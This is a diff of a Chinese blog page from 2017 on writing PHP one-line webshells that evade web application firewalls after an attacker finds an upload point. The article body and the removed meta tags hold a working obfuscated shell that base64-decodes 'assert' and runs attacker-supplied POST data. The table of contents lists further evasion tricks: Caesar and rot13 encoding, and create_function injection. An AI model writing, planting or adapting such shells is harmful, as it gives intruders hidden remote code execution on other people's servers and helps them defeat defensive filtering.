@@ -5,19 +5,16 @@
   
   <title>一句话Shell编写思路 | iosmosis&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 
-经典方式应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如：12345678&amp;lt;?php $jg16=base64_decode;$z=$jg16(YXNzZXJ0);$z($_POST[q]);?&amp;gt;这个一句话需要用到这个函数//base64_encode(">
+  <meta name="description" content="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一句话Shell编写思路">
 <meta property="og:url" content="http://iosmosis.github.io/2017/03/05/oneshell/index.html">
 <meta property="og:site_name" content="iosmosis's blog">
-<meta property="og:description" content="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 
-经典方式应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如：12345678&amp;lt;?php $jg16=base64_decode;$z=$jg16(YXNzZXJ0);$z($_POST[q]);?&amp;gt;这个一句话需要用到这个函数//base64_encode(">
-<meta property="og:updated_time" content="2017-03-07T14:20:27.372Z">
+<meta property="og:description" content="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路">
+<meta property="og:updated_time" content="2017-03-08T06:14:54.885Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一句话Shell编写思路">
-<meta name="twitter:description" content="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 
-经典方式应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如：12345678&amp;lt;?php $jg16=base64_decode;$z=$jg16(YXNzZXJ0);$z($_POST[q]);?&amp;gt;这个一句话需要用到这个函数//base64_encode(">
+<meta name="twitter:description" content="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路">
   
     <link rel="alternative" href="/atom.xml" title="iosmosis&#39;s blog" type="application/atom+xml">
   
@@ -229,7 +226,12 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 </p>
+        <h3 id="很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路"><a href="#很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路" class="headerlink" title="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路"></a>很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路</h3><ul>
+<li><a id="more"></a>
+<the rest="" of="" contents="" |="" 余下全文="">
+
+</the></li>
+</ul>
 <h2 id="经典方式"><a href="#经典方式" class="headerlink" title="经典方式"></a>经典方式</h2><h3 id="应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如："><a href="#应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如：" class="headerlink" title="应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如："></a>应该是很常见的方法 利用 <a href="http://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="external">可变变量</a>进行赋值传值来打到过狗目的，例如：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $jg16=base64_decode;</div><div class="line">$z=$jg16(YXNzZXJ0);</div><div class="line">$z($_POST[q]);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">这个一句话需要用到这个函数</div><div class="line"><span class="comment">//base64_encode();//base64编码</span></div><div class="line"><span class="comment">//base64_decode();//base64解码</span></div><div class="line">主要就是进行加密然后传值绕过对一句话的检测　这次暂不详细讲解</div></pre></td></tr></table></figure>
 <p>##system()的巧妙利用</p>
 <p>##调用system()由于在php中system函数属于系统函数所以对于一般的waf是可以通杀的 </p>
@@ -295,7 +297,7 @@
         <p><span>本文标题:</span><a href="/2017/03/05/oneshell/">一句话Shell编写思路</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 iosmosis 的个人博客">iosmosis</a></p>
         <p><span>发布时间:</span>2017年03月05日 - 12时47分</p>
-        <p><span>最后更新:</span>2017年03月07日 - 22时20分</p>
+        <p><span>最后更新:</span>2017年03月08日 - 14时14分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2017/03/05/oneshell/" title="一句话Shell编写思路">http://iosmosis.github.io/2017/03/05/oneshell/</a>
             <span class="copy-path" data-clipboard-text="原文: http://iosmosis.github.io/2017/03/05/oneshell/　　作者: iosmosis" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -328,7 +330,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#经典方式"><span class="toc-number">1.</span> <span class="toc-text">经典方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如："><span class="toc-number">1.1.</span> <span class="toc-text">应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用古典密码进行对shell加密"><span class="toc-number">2.</span> <span class="toc-text">利用古典密码进行对shell加密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）"><span class="toc-number">2.1.</span> <span class="toc-text">在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"><span class="toc-number">2.2.</span> <span class="toc-text">这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用函数代码执行来代替eval"><span class="toc-number">3.</span> <span class="toc-text">利用函数代码执行来代替eval</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行"><span class="toc-number">3.1.</span> <span class="toc-text">利用 create_function代码执行漏洞 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起"><span class="toc-number">3.2.</span> <span class="toc-text">这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路"><span class="toc-number">1.</span> <span class="toc-text">很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#经典方式"><span class="toc-number"></span> <span class="toc-text">经典方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如："><span class="toc-number">1.</span> <span class="toc-text">应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用古典密码进行对shell加密"><span class="toc-number"></span> <span class="toc-text">利用古典密码进行对shell加密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）"><span class="toc-number">1.</span> <span class="toc-text">在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"><span class="toc-number">2.</span> <span class="toc-text">这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用函数代码执行来代替eval"><span class="toc-number"></span> <span class="toc-text">利用函数代码执行来代替eval</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行"><span class="toc-number">1.</span> <span class="toc-text">利用 create_function代码执行漏洞 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起"><span class="toc-number">2.</span> <span class="toc-text">这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
